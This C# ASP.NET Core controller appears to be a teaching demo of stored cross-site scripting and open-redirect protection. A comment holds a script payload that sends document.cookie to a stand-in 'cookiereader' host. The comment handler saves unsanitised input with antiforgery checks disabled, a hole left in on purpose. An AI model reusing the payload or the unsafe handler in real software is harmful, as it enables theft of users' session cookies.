using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using System.Text.Encodings.Web;
using XSS.Web.Models;

namespace XSS.Web.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        // Encoders for code level: 
        private HtmlEncoder _htmlEncoder;
        private JavaScriptEncoder _javascriptEncoder;
        private UrlEncoder _urlEncoder;

        public HomeController(ILogger<HomeController> logger, JavaScriptEncoder javascriptEncoder, UrlEncoder urlEncoder)
        {
            _logger = logger;
            _javascriptEncoder = javascriptEncoder; 
            _urlEncoder = urlEncoder;
        }

        
        public IActionResult CommentAdd()
        {
            // <script>new Image().src="http://www.example.com/cookiereader?accountinformation="+ document.cookie</script>
            // <script>alert(document.cookie)</script>
            HttpContext.Response.Cookies.Append("email", "example@mail.com");
            HttpContext.Response.Cookies.Append("password", "1234");

            if(System.IO.File.Exists("comment.txt"))
            {
                ViewBag.comments = System.IO.File.ReadAllLines("comment.txt");
            }

            return View();
        }
        [IgnoreAntiforgeryToken]
        //[ValidateAntiForgeryToken]
        [HttpPost]
        public IActionResult CommentAdd(string name, string comment)
        {

            string encodeName = _urlEncoder.Encode(name);

            ViewBag.name = name;
            ViewBag.comment = comment;

            // Stored XSS
            System.IO.File.AppendAllText("comment.txt", $"{name}--{comment}\n");

            return RedirectToAction("CommentAdd");
        }

        // https://localhost:7148/home/login?returnUrl=https://www.bloomberg.com (redirects to bloomberg)
        public IActionResult Login(string returnUrl = "/")
        {
            TempData["returnUrl"] = returnUrl;

            return View();
        }

        [HttpPost]
        public IActionResult Login(string email, string password)
        {
            string returnUrl = TempData["returnUrl"].ToString();

            // email password control
            // ......................

            // blocking open redirect attack
            // checking return url:
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }

            return Redirect("/");
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}